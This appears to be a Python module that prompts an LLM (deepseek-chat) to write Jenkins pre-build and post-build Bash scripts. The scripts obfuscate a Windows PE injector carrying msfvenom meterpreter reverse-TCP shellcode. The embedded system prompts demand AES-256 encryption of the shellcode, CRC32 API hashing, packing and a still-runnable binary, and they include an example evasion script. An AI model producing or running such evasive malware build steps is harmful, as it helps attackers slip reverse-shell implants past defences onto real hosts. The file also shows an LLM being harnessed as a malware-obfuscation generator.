from openai import OpenAI

# NOTE: Portions of the PRE_SYSTEM_PROMPT and POST_SYSTEM_PROMPT were generated via ChatGPT 4o-mini and heavily tweaked and modified by a human author.

PRE_SYSTEM_PROMPT = r"""
You are creating a production-grade pre-build obfuscation script that MUST follow these rules:

1. Output Format:
- Respond ONLY with valid Bash script content
- Properly escape all special characters for Bash
- Use this pattern for single quotes inside double-quoted strings: `'"'"'`
- Never leave unescaped quotes or shell special characters
- The output should always start with #!/bin/bash, and end with the last command in the script. Nothing else should be include in the response. Again, respond ONLY with valid Bash script conte.t

2. Pipeline Requirements:
- Must work with Jenkins environment variables:
  SHELLCODE_PATH=src/Simple/PE-Injector/base.cpp
  MALWARE_PATH=src/Simple/PE-Injector/PE-Injector.cpp
  EXECUTABLE_NAME=injector.exe
- Preserve original compilation command (DO NOT INCLUDE COMPILATION STEP IN PRE-BUILD SCRIPT, THIS WILL BE RUN AFTER THE PRE-BUILD SCRIPT IS RAN IN A DIFFERENT STAGE IN THE PIPELINE):
  x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_PATH -lpsapi
- Shellcode is already generated in a previous stage in the pipeline using the following command (DO NOT INCLUDE SHELLCODE GENERATION WITHIN THE PRE-BUILD SCRIPT), and the pre-build script must work with the already generated shellcode:
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x64/xor_context C_HOSTNAME=$HOSTNAME -f c -o base.cpp

3. Required Evasion Techniques (MUST FULLY IMPLEMENT ALL):
- AES-256-CBC encryption with runtime decryption
- CRC32 API hashing with dynamic resolution
- Convert the encrypted binary to a C array with `xxd -i`
- Replace the array definition with:
    `const unsigned char buf[] = { ... };`

4. SED AND INSERTION GUIDELINES:
- You MAY use `sed` for small substitutions (e.g. replacing function calls)
- For inserting large blocks (like decryption functions), use one of the following techniques:
  - `sed '/pattern/r temp_file.c'` to insert content from a file
  - `cat` to prepend or append defines (e.g. `#define KEY "..."`)
  - Avoid using `sed -i` with long inline multi-line strings — it breaks in many sed environments
- If inserting code, ensure C++ syntax remains valid and compiles

5. Safety:
- POSIX-compliant, non-interactive
- Directly executable in Jenkins' Bash environment
- Any commands, sed especially MUST work and be compatible with modern C++

EXAMPLE OUTPUT:
#!/bin/bash
# Generate AES key and IV
KEY=$(openssl rand -hex 32)
IV=$(openssl rand -hex 16)

# Encrypt the shellcode
openssl enc -aes-256-cbc -in "$SHELLCODE_PATH" -out encrypted.bin -K "$KEY" -iv "$IV"

# Convert to C array and replace declaration
xxd -i encrypted.bin | sed 's/unsigned char .* = {/const unsigned char buf[] = {/' | sed 's/unsigned int .* = /const unsigned int buf_len = /' > "$SHELLCODE_PATH"

# Insert decryption and hashing code using sed or cat
echo "#define KEY \"$KEY\"" > defines.h
echo "#define IV \"$IV\"" >> defines.h
cat defines.h "$MALWARE_PATH" > temp && mv temp "$MALWARE_PATH"

# Insert API hashing and decrypt code near #include "base.cpp"
echo "$DECRYPTION_CODE" > crypto.c
sed '/#include "base.cpp"/r crypto.c' "$MALWARE_PATH" > temp && mv temp "$MALWARE_PATH"

# Replace known API calls with dynamic_resolve("...")
sed -i 's/GetModuleHandleA/dynamic_resolve("GetModuleHandleA")/g' "$MALWARE_PATH"
"""

POST_SYSTEM_PROMPT = r"""
You are creating a production-grade post-build obfuscation script that MUST follow these rules:

1. Output Format:
- Respond ONLY with valid Bash script content
- Properly escape all special characters for Bash
- Use this pattern for single quotes inside double-quoted strings: `'"'"'`
- Never leave unescaped quotes or shell special characters
- The output should always start with #!/bin/bash, and end with the last command in the script. Nothing else should be include in the response. Again, respond ONLY with valid Bash script conte.t

2. Pipeline Requirements:
- Must work with Jenkins environment variables:
  EXECUTABLE_NAME=injector.exe
- The malware has already been compiled using the following command in a previous CI step (DO NOT RUN THIS IN THE POST-BUILD SCRIPT):
  x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_PATH -lpsapi
  This means the post-build script will just be modifying the compiled executable.

3. Required Evasion Techniques (MUST FULLY IMPLEMENT ALL):
- Packing (packed / finalized executable must be named packed_injector.exe so it get's stashed properly by Jenkins)

4. Safety:
- POSIX-compliant, non-interactive
- Directly executable in Jenkins' Bash environment
- Any commands, sed especially MUST work and be compatible with modern C++
- DO NOT USE WINE AT ALL COSTS, THIS CAN NOT BE A DEPENDENCY OF THE POST BUILD TOOLS USED
- DO NOT INVALIDATE THE PE, IT MUST BE ABLE TO RUN ON A WINDOWS SERVER 2022 HOST

EXAMPLE OUTPUT:
#!/bin/bash
# Install required dependencies and tools
sudo apt-get install -y <packages (LLM will fill this out)>
< insert additional commands if needed here (LLM will fill this out, not the end user)>
# Run commands to implement all required evasion techniques
< insert commands here (LLM will fill this out, not the end user)>
"""


class Client:
    def __init__(
        self,
        api_key: str,
        base_url: str,
        shellcode_path: str,
        malware_path: str,
        executable_name: str,
    ):
        self.client = OpenAI(
            base_url=base_url,
            api_key=api_key,
        )
        self.shellcode_path = shellcode_path
        self.malware_path = malware_path
        self.executable_name = executable_name

    def prebuild(self):
        """
        prebuild generates a pre-build script to be ran in the CI/CD pipeline.
        """
        with open(self.malware_path, "r") as file:
            malware = file.read()
            user_prompt = f"$SHELLCODE_PATH: {self.shellcode_path}\n$MALWARE_PATH: {self.malware_path}\nmalware:\n{malware}"

            response = self.client.chat.completions.create(
                model="deepseek-chat",
                messages=[
                    {"role": "system", "content": PRE_SYSTEM_PROMPT},
                    {"role": "user", "content": user_prompt},
                ],
            )

            script_content = response.choices[0].message.content.strip()
            print(script_content)

            with open("prebuild.sh", "w") as f:
                f.write(f"{script_content}\n")

    def postbuild(self):
        """
        postbuild generates a post-build script to be ran in the CI/CD pipeline.
        """
        user_prompt = f"EXECUTABLE_NAME: {self.executable_name}"

        response = self.client.chat.completions.create(
            model="deepseek-chat",
            messages=[
                {"role": "system", "content": POST_SYSTEM_PROMPT},
                {"role": "user", "content": user_prompt},
            ],
        )

        script_content = response.choices[0].message.content.strip()
        print(script_content)

        with open("postbuild.sh", "w") as f:
            f.write(f"{script_content}\n")
